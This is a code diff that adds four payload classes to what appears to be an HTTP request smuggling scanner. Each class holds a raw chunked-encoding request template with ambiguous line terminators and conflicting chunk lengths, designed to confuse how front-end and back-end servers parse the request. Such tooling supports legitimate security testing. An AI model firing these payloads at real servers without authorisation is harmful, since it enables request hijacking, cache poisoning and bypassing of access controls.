@@ -162,3 +162,119 @@ class SPILL_TERM(Payload):
             "\r\n"
         )
 
+
+class ONE_TWO(Payload):
+    @property
+    def pretty_name(self):
+        return "Length-based: ONE.TWO"
+
+    @property
+    def ambiguous_line_terminators(self):
+        return ["\n", "\r"]
+
+    @property
+    def payload_templ(self):
+        return (
+            "{method} {path} HTTP/1.1\r\n"
+            "Host: {host}\r\n"
+            "Transfer-Encoding: chunked\r\n"
+            "{headers}"
+            "\r\n"
+            "2\r\n"
+            "XX{line_terminator}"
+            "12\r\n"
+            "XX\r\n"
+            "19\r\n"
+            "XXAAAABBBB\r\n"
+            "0\r\n"
+            "\r\n"
+            "CCCCDDDD\r\n"
+            "0\r\n"
+            "\r\n"
+        )
+
+
+class TWO_ONE(Payload):
+    @property
+    def pretty_name(self):
+        return "Length-based: TWO.ONE"
+
+    @property
+    def ambiguous_line_terminators(self):
+        return ["\n", "\r"]
+
+    @property
+    def payload_templ(self):
+        return (
+            "{method} {path} HTTP/1.1\r\n"
+            "Host: {host}\r\n"
+            "Transfer-Encoding: chunked\r\n"
+            "{headers}"
+            "\r\n"
+            "2\r\n"
+            "XX{line_terminator}"
+            "10\r\n"
+            "\r\n"
+            "AAAABBBBCCCCDD\r\n"
+            "0\r\n"
+            "\r\n"
+        )
+
+
+class ZERO_TWO(Payload):
+    @property
+    def pretty_name(self):
+        return "Length-based: ZERO.TWO"
+
+    @property
+    def ambiguous_line_terminators(self):
+        return [""]
+
+    @property
+    def payload_templ(self):
+        return (
+            "{method} {path} HTTP/1.1\r\n"
+            "Host: {host}\r\n"
+            "Transfer-Encoding: chunked\r\n"
+            "{headers}"
+            "\r\n"
+            "2\r\n"
+            "XX{line_terminator}"
+            "012\r\n"
+            "XX\r\n"
+            "19\r\n"
+            "XXAAAABBBB\r\n"
+            "0\r\n"
+            "\r\n"
+            "CCCCDDDD\r\n"
+            "0\r\n"
+            "\r\n"
+        )
+
+
+class TWO_ZERO(Payload):
+    @property
+    def pretty_name(self):
+        return "Length-based: TWO.ZERO"
+
+    @property
+    def ambiguous_line_terminators(self):
+        return [""]
+
+    @property
+    def payload_templ(self):
+        return (
+            "{method} {path} HTTP/1.1\r\n"
+            "Host: {host}\r\n"
+            "Transfer-Encoding: chunked\r\n"
+            "{headers}"
+            "\r\n"
+            "2\r\n"
+            "xx{line_terminator}"
+            "010\r\n"
+            "\r\n"
+            "AAAABBBBCCCCDD\r\n"
+            "0\r\n"
+            "\r\n"
+        )
+
